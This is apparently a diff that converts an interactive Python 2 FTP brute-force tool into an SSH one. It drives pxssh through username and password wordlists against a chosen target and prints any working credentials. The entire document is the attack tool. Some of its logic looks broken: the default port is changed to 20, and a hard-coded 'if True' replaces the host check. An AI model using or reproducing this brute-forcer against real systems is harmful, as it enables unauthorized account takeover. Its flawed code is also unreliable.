@@ -3,7 +3,10 @@
 # Script by LeSZO ZerO
 # 07/03/2015
 from core import help
-from lib.ftplib.ftplib import FTP
+import optparse
+import pxssh
+import os
+import sys
 W  = '\033[0m'  
 R  = '\033[31m' 
 G  = '\033[32m' 
@@ -13,13 +16,13 @@ P  = '\033[35m'
 C  = '\033[36m' 
 GR = '\033[37m'
 defaulthost="localhost"
-defaultport="21"
+defaultport="20"
 defaultdic1="core/db/user.dicc"
 defaultdic2="core/db/pass.dicc"
-def btftp():
+def btssh():
 	try:
 		global defaulthost,defaultport,defaultdic1,defaultdic2
-		actions = raw_input(B+"   bt/ftp > "+W)
+		actions = raw_input(B+"   bt/ssh > "+W)
 		if actions == "show options":
 			print "     ["+R+"+"+W+"] options"
 			print "     target         : yes"
@@ -30,24 +33,24 @@ def btftp():
 			print "     port           : ",defaultport
 			print "     dictionary_1   : ",defaultdic1
 			print "     dictionary_2   : ",defaultdic2
-			btftp()
+			btssh()
 		elif actions[0:10] == "set target":
 			defaulthost = actions[11:]
 			defaulthost = defaulthost.replace("http://", "")
 			print "     target         : "+defaulthost+" "+O+"     Saved!!!"+W
-			btftp()
+			btssh()
 		elif actions[0:8] == "set port":
 			defaultport = actions[9:]
 			print "     port           : "+defaultport+" "+O+"     Saved!!!"+W
-			btftp()
+			btssh()
 		elif actions[0:16] == "set dictionary_1":
 				defaultdic1 = actions[17:]
 				print "     dictionary_1   : "+defaultdic1+" "+O+"     Saved!!!"+W
-				btftp()
+				btssh()
 		elif actions[0:16] == "set dictionary_2":
 				defaultdic2 = actions[17:]
 				print "     dictionary_2   : "+defaultdic2+" "+O+"     Saved!!!"+W
-				btftp()
+				btssh()
 
 		elif actions=="back":
 			pass 
@@ -68,7 +71,7 @@ def btftp():
 					print "     dictionary_2   : ",defaultdic2
 					print 
 					try:
-						ftp = FTP(defaulthost)
+						#ftp = FTP(defaulthost)
 						if True:
 							print("     ["+G+"+"+W+"] target LIVE")
 							print("     ["+G+"+"+W+"] Running")
@@ -80,7 +83,8 @@ def btftp():
 												us=us.replace("\n","")
 												ps=ps.replace("\n","")
 												try:
-													ftp.login(us,ps)
+													connect = pxssh.pxssh()
+													connect.login(defaulthost,us,ps)
 													if True:
 														print "     ["+G+"+"+W+"] SUCCESSFUL with username : "+us+" , password : "+ps+"\n"
 														return
@@ -94,4 +98,4 @@ def btftp():
 						print("     ["+R+"-"+W+"] target DEAD")
 	except(KeyboardInterrupt, SystemExit):
 		print("   ["+O+"!"+W+"] (Ctrl + C) Detected, System Exit")
-	btftp()
+	btssh()
